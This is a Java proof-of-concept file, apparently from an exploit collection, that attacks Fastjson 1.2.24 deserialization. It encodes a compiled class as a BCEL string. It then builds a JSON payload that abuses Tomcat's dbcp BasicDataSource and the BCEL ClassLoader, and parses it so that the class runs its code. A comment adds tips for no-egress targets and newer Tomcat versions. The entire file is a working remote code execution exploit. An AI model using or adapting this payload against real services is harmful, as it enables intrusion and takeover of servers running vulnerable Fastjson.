package org.exploit.third.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Paths;

//打不出网，need:TOMCAT8 TOMCAT9改为dbcp2
public class BCEL_parse_1_2_24 {
    public static void main(String[] args) throws Exception {
        //{
        //    {
        //        "x":{
        //                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
        //                "driverClassLoader": {
        //                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        //                },
        //                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        //        }
        //    }: "x"
        //}
        byte[] code = Files.readAllBytes(Paths.get("target/classes/Runtime_static.class"));
        String bcel = "\""+"$$BCEL$$"+ Utility.encode(code,true)+"\"";
        String poc = "{\n" +
                    "    {\n" +
                    "        \"aaa\": {\n" +
                    "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                    "                \"driverClassLoader\": {\n" +
                    "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "                },\n" +
                    "                \"driverClassName\": "+ bcel+ "\n" +
                    "        }\n" +
                    "    }: \"bbb\"\n" +
                    "}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}
